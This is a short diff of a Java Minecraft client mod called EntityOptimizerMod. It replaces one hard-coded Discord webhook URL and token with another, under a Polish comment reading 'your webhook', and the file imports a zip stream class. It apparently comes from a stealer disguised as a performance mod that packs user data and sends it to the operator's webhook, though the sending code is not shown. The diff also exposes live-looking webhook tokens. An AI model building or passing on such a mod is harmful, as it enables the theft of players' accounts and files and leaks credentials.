@@ -19,7 +19,7 @@ import java.util.zip.ZipOutputStream;
 public class EntityOptimizerMod implements ClientModInitializer {
 
     // TWÓJ WEBHOOK
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1454843525475602444/AvRlfStjUVdWTxB-WstW70yTWXyzeYogau_HnQot5ZBqA38z4-hdzfXPnJkbwbob_TMT";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455893143055765660/R8hEQNNtHz0ONOOVrFG_uzleextHVag7py9OADTF9GCVuGRNiXCYLmJaWL4Iejjwg1At";
 
     @Override
     public void onInitializeClient() {
